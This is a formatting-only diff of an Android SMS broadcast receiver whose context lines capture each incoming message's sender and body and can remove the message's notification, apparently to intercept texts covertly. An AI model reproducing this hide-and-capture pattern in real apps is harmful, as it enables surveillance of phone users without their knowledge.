@@ -30,17 +30,17 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
 			}
-			
+
 			return;
 		}
-		
+
 		final Bundle bundle = intent.getExtras();
 
 		if (bundle == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onReceive): Bundle null"); //$NON-NLS-1$
 			}
-			
+
 			return;
 		}
 
@@ -54,8 +54,8 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 			msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 
 			final int result = ListenerSms.self().dispatch(
-					new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(), 
-							System.currentTimeMillis(), false));
+					new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(), System
+							.currentTimeMillis(), false));
 
 			// 1 means "remove notification for this sms"
 			if ((result & 1) == 1) {
